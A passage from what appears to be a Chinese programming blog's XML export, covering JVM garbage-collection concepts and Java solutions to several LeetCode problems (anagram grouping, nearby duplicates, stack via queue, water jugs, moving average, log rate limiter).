<h4 id="原始快照"><a href="#原始快照" class="headerlink" title="原始快照"></a>原始快照</h4><p>原始快照破坏的是第二个条件，当灰色对象要删除指向白色对象的引用关系时，就将会这个要删除的引用记录下来，在并发扫描结束之后，再将这些记录过引用关系中的灰色节点微耕，重新扫描一次，这也可以简化理解为，无论引用关系删除与否，都会按照刚刚开始扫描的那一刻的对象图快照进行搜索。G1和Shenandoah使用原始快照来做并发标记的。</p>
<h3 id="新生代分区"><a href="#新生代分区" class="headerlink" title="新生代分区"></a>新生代分区</h3><p>新生代内存区域是使用标记复制算法来回收内存的。但是它不是按照1：1的比例分成两块内存区域。而是分为了一块较大的Eden空间和两块较小的Survivor空间，比例是8：1：1.这样每次新生代就有90%的空间是可以使用的。</p>
<p>每次都会在Eden空间上分配内存，然后新生代回收的时候会把存活的对象（Eden区和其中一块Survivor区域，如果有存活对象的话）移动到其中的另一块Survivor空间上。</p>
<h3 id="分配担保"><a href="#分配担保" class="headerlink" title="分配担保"></a>分配担保</h3><p>大多数情况下，新生代98%的对象都是朝生夕死的，但是谁也不能保证，新生代每次回收的时候内存不超过新生代大小的10%。这个时候就要依赖于分配担保了。当Survivor区域的内存不够一次Monor GC之后存活的对象时，就需要依赖其他内存区域（实际上大多数是老年代）进行分配担保。</p>
<p>如果一块Survivor空间没有足够空间存放上一次新生代收集下来的存活对象，这些对象便将通过分配担保机制直接进入老年代。</p>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><table>
<thead>
<tr>
<th>名词</th>
<th>释义</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>MinorGC/Young GC</td>
<td>新生代收集</td>
<td>目标只是新生代的垃圾收集</td>
</tr>
<tr>
<td>Major GC/Old GC</td>
<td>老年代收集</td>
<td>目标只是老年代的垃圾收集。当前只有CMS收集器会有单独收集老年代的行为。另外，需要注意“Major GC”，有的资料上还指整堆手记</td>
</tr>
<tr>
<td>Mixed GC</td>
<td>混合收集</td>
<td>指目标时手记整个新生代及部分老年代的垃圾收集器。目前只有G1收集器会有这种行为。</td>
</tr>
<tr>
<td>Full GC</td>
<td>整堆收集</td>
<td>收集整个Java堆和方法区的垃圾收集。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
        <tag>垃圾回收算法</tag>
        <tag>标记-复制</tag>
        <tag>标记-整理</tag>
        <tag>标记-清除</tag>
        <tag>分代收集</tag>
      </tags>
  </entry>
  <entry>
    <title>49. 字母异位词分组</title>
    <url>/2020/04/02/LeetCode/leetcode-000049-%E5%AD%97%E6%AF%8D%E5%BC%82%E4%BD%8D%E8%AF%8D%E5%88%86%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串数组，将字母异位词组合在一起。字母异位词指字母相同，但排列不同的字符串。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="string">"eat"</span>, <span class="string">"tea"</span>, <span class="string">"tan"</span>, <span class="string">"ate"</span>, <span class="string">"nat"</span>, <span class="string">"bat"</span>],</span><br><span class="line">输出:</span><br><span class="line">[</span><br><span class="line">  [<span class="string">"ate"</span>,<span class="string">"eat"</span>,<span class="string">"tea"</span>],</span><br><span class="line">  [<span class="string">"nat"</span>,<span class="string">"tan"</span>],</span><br><span class="line">  [<span class="string">"bat"</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><ul>
<li>所有输入均为小写字母。</li>
<li>不考虑答案输出的顺序。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap</p>
<p>将每个字符串排序，以排序后的字符串为key，保存所有排序完相等的字符串列表即可。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;</span><br><span class="line">		Map&lt;String, List&lt;String&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String str : strs) &#123;</span><br><span class="line">			<span class="keyword">char</span>[] cs = str.toCharArray();</span><br><span class="line">			Arrays.sort(cs);</span><br><span class="line">			String string = <span class="keyword">new</span> String(cs);</span><br><span class="line">			<span class="keyword">if</span> (!map.containsKey(string)) &#123;</span><br><span class="line">				List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">				list.add(str);</span><br><span class="line">				map.put(string, list);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				map.get(string).add(str);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		List&lt;List&lt;String&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		result.addAll(map.values());</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>219. 存在重复元素 II</title>
    <url>/2020/04/02/LeetCode/leetcode-000219-%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组和一个整数 k，判断数组中是否存在两个不同的索引 i 和 j，使得 nums [i] = nums [j]，并且 i 和 j 的差的 绝对值 至多为 k。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>], k = <span class="number">3</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: nums = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>], k = <span class="number">1</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], k = <span class="number">2</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历数组，假设当前数字索引为i，那么计算从i+1 到i+k是否有其相同的元素，有返回true，否则继续判断下一个数字</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsNearbyDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			<span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">while</span> (count &lt;= k &amp;&amp; i + count &lt; nums.length) &#123;</span><br><span class="line">				<span class="keyword">if</span> (nums[i] == nums[i + count]) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">                count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>借助HashMap。</p>
<p>遍历数组，在遍历的过程中，判断该数字是否已经存在HashMao中了。</p>
<p>如果已经存在，挨个计算它之前的索引和当前索引差是否超过k，没有则返回true；</p>
<p>否则把当前索引加入索引列表中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsNearbyDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		Map&lt;Integer, List&lt;Integer&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (map.containsKey(nums[i])) &#123;</span><br><span class="line">				List&lt;Integer&gt; list = map.get(nums[i]);</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> num : list) &#123;</span><br><span class="line">					<span class="keyword">if</span> (k &gt;= Math.abs(num - i)) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">					&#125; </span><br><span class="line">				&#125;</span><br><span class="line">				map.get(nums[i]).add(i);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">				list.add(i);</span><br><span class="line">				map.put(nums[i], list);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>使用HashSet。</p>
<p>遍历数组，对于每个元素做以下操作：</p>
<ol>
<li>在散列表中搜索当前元素，如果找到了就返回 <code>true</code>。</li>
<li>在散列表中插入当前元素。</li>
<li>如果当前散列表的大小超过了 kkk， 删除散列表中最旧的元素。</li>
</ol>
<p>返回false</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsNearbyDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (set.contains(nums[i])) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        set.add(nums[i]);</span><br><span class="line">        <span class="keyword">if</span> (set.size() &gt; k) &#123;</span><br><span class="line">            set.remove(nums[i - k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>225. 用队列实现栈</title>
    <url>/2020/04/02/LeetCode/leetcode-000225-%E7%94%A8%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0%E6%A0%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>使用队列实现栈的下列操作：</p>
<ul>
<li>push(x) – 元素 x 入栈</li>
<li>pop() – 移除栈顶元素</li>
<li>top() – 获取栈顶元素</li>
<li>empty() – 返回栈是否为空</li>
</ul>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li>你只能使用队列的基本操作– 也就是 push to back, peek/pop from front, size, 和 is empty 这些操作是合法的。</li>
</ul>
<ul>
<li>你所使用的语言也许不支持队列。 你可以使用 list 或者 deque（双端队列）来模拟一个队列 , 只要是标准的队列操作即可。</li>
<li>你可以假设所有操作都是有效的（例如, 对一个空的栈不会调用 pop 或者 top 操作）。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用LinkedList模拟栈</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	    LinkedList&lt;Integer&gt; values;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="title">MyStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    	values = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Push element x onto stack. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	    	values.addLast(x);</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Removes the element on top of the stack and returns that element. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    	<span class="keyword">int</span> value = values.removeLast();</span><br><span class="line">	    	<span class="keyword">return</span> value;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Get the top element. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    	<span class="keyword">return</span> values.peekLast();</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Returns whether the stack is empty. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    	<span class="keyword">return</span> values.isEmpty();</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>设计</tag>
        <tag>队列</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>365. 水壶问题</title>
    <url>/2020/04/02/LeetCode/leetcode-000365-%E6%B0%B4%E5%A3%B6%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>有两个容量分别为 x升 和 y升 的水壶以及无限多的水。请判断能否通过使用这两个水壶，从而可以得到恰好 z升 的水？</p>
<p>如果可以，最后请用以上水壶中的一或两个来盛放取得的 z升 水.</p>
<p>你允许：</p>
<ul>
<li>装满任意一个水壶</li>
<li>清空任意一个水壶</li>
<li>从一个水壶向另外一个水壶倒水，直到装满或者倒空</li>
</ul>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: x &#x3D; 3, y &#x3D; 5, z &#x3D; 4</span><br><span class="line">输出: True</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: x &#x3D; 2, y &#x3D; 6, z &#x3D; 5</span><br><span class="line">输出: False</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>例子中的3升的水壶和5升的水壶，得到4升水，可以这么操作</p>
<ol>
<li>装满3升水壶，倒入5升水壶</li>
<li>再装满3升水壶，倒入5升水壶，此时3升水壶剩1升水，5升水壶已装满</li>
<li>倒空5升水壶，将3升水壶的1升水倒入5升水壶，此时3升水壶为空，5升水壶剩1升水</li>
<li>装满3升水壶，倒入5升水壶，此时5升水壶的水刚好为4升</li>
</ol>
<p>再看一个例子，用7升和13升的水壶，能否到处3升的水</p>
<ol>
<li>装满7升的水壶，倒入13升的水壶</li>
<li>再装满7升的水壶，倒入13升的水壶直至满，此时，7升的水壶剩1升水</li>
<li>清空13升的水壶，并将7升水壶的1升水，倒入13升的水壶</li>
<li>继续装满13升的水壶，此时，7升的水壶剩2升</li>
<li>清空13升的水壶，并将7升水壶的2升水倒入13升的水壶中</li>
<li>装满13升的水壶，此时7升的水壶剩3升水</li>
</ol>
<p>例子1可以抽象为3x mod 5 = 4，这里x=3，也就是要装满3次3升的水壶</p>
<p>例子2可以抽象为7xmod13=3，这里x=6，也就是要装满6次7升的水壶</p>
<p>再把问题抽象得到</p>
<p>X*x mod Y == Z</p>
<p>求这个方程是否有解？</p>
<p>此处可参考<a href="https://blog.csdn.net/lanchunhui/article/details/50593075" target="_blank" rel="noopener">扩展欧几里得算法</a></p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canMeasureWater</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (x + y &lt; z) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (x == <span class="number">0</span> || y == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> z == <span class="number">0</span> || x + y == z;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> z % gcd(x, y) == <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b, a % b);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>346. 数据流中的移动平均值</title>
    <url>/2020/04/02/LeetCode/leetcode-000346-%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E7%A7%BB%E5%8A%A8%E5%B9%B3%E5%9D%87%E5%80%BC/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数据流和一个窗口大小，根据该滑动窗口的大小，计算其所有整数的移动平均值。</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MovingAverage m &#x3D; new MovingAverage(3);</span><br><span class="line">m.next(1) &#x3D; 1</span><br><span class="line">m.next(10) &#x3D; (1 + 10) &#x2F; 2</span><br><span class="line">m.next(3) &#x3D; (1 + 10 + 3) &#x2F; 3</span><br><span class="line">m.next(5) &#x3D; (10 + 3 + 5) &#x2F; 3</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用LinkedList，当元素满足k个大小，新增一个元素时，移除队首元素，再新增元素，否则直接新增元素。</p>
<p>每次都统计平均值。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MovingAverage</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> LinkedList&lt;Integer&gt; values;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MovingAverage</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    	values = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    	<span class="keyword">this</span>.size = size;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (values.size() == size) &#123;</span><br><span class="line">    		<span class="comment">// 队列已满</span></span><br><span class="line">    		values.removeFirst();</span><br><span class="line">    	&#125;</span><br><span class="line">    	values.addLast(val);</span><br><span class="line">    	<span class="keyword">return</span> countAverage();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">double</span> <span class="title">countAverage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line">    	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; values.size();i++) &#123;</span><br><span class="line">    		sum += values.get(i);</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> sum / values.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>解法一优化版，统计的时候保存上一次的平均值总和，然后计算当前平均值</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MovingAverage</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> LinkedList&lt;Integer&gt; values;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">double</span> lastSum = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MovingAverage</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    	values = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    	<span class="keyword">this</span>.size = size;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (values.size() == size) &#123;</span><br><span class="line">    		<span class="comment">// 队列已满</span></span><br><span class="line">    		<span class="keyword">int</span> value = values.removeFirst();</span><br><span class="line">    		lastSum -= value;</span><br><span class="line">    	&#125;</span><br><span class="line">    	values.addLast(val);</span><br><span class="line">    	lastSum += val;</span><br><span class="line">    	<span class="keyword">return</span> countAverage();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">double</span> <span class="title">countAverage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> lastSum / values.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>队列</tag>
        <tag>循环队列</tag>
      </tags>
  </entry>
  <entry>
    <title>359. 日志速率限制器</title>
    <url>/2020/04/02/LeetCode/leetcode-000359-%E6%97%A5%E5%BF%97%E9%80%9F%E7%8E%87%E9%99%90%E5%88%B6%E5%99%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>请你设计一个日志系统，可以流式接收日志以及它的时间戳。</p>
<p>该日志会被打印出来，需要满足一个条件：当且仅当日志内容 在过去的 10 秒钟内没有被打印过。</p>
<p>给你一条日志的内容和它的时间戳（粒度为秒级），如果这条日志在给定的时间戳应该被打印出来，则返回 true，否则请返回 false。</p>
<p>要注意的是，可能会有多条日志在同一时间被系统接收。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Logger logger = <span class="keyword">new</span> Logger();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日志内容 "foo" 在时刻 1 到达系统</span></span><br><span class="line">logger.shouldPrintMessage(<span class="number">1</span>, <span class="string">"foo"</span>); returns <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 日志内容 "bar" 在时刻 2 到达系统</span></span><br><span class="line">logger.shouldPrintMessage(<span class="number">2</span>,<span class="string">"bar"</span>); returns <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日志内容 "foo" 在时刻 3 到达系统</span></span><br><span class="line">logger.shouldPrintMessage(<span class="number">3</span>,<span class="string">"foo"</span>); returns <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日志内容 "bar" 在时刻 8 到达系统</span></span><br><span class="line">logger.shouldPrintMessage(<span class="number">8</span>,<span class="string">"bar"</span>); returns <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日志内容 "foo" 在时刻 10 到达系统</span></span><br><span class="line">logger.shouldPrintMessage(<span class="number">10</span>,<span class="string">"foo"</span>); returns <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日志内容 "foo" 在时刻 11 到达系统</span></span><br><span class="line">logger.shouldPrintMessage(<span class="number">11</span>,<span class="string">"foo"</span>); returns <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HashMap</p>
<p>如果当前日志不在map中，将日志加入map中，返回true；</p>
<p>如果当前日志在map中，判断时间，超过10s，返回true，同时更新最新的时间；否则返回false，</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Map&lt;String, Integer&gt; map;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Logger</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns true if the message should be printed in the given timestamp, otherwise returns false.</span></span><br><span class="line"><span class="comment">        If this method returns false, the message will not be printed.</span></span><br><span class="line"><span class="comment">        The timestamp is in seconds granularity. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldPrintMessage</span><span class="params">(<span class="keyword">int</span> timestamp, String message)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (!map.containsKey(message)) &#123;</span><br><span class="line">    		map.put(message, timestamp);</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    		<span class="keyword">int</span> oldTime = map.get(message);</span><br><span class="line">    		<span class="keyword">if</span> (timestamp - oldTime &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                map.put(message, timestamp);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>借助HashMap。</p>
<p>遍历数组，在遍历的过程中，判断该数字是否已经存在HashMao中了。</p>
<p>如果已经存在，挨个计算它之前的索引和当前索引差是否超过k，没有则返回true；</p>
<p>否则把当前索引加入索引列表中</p>
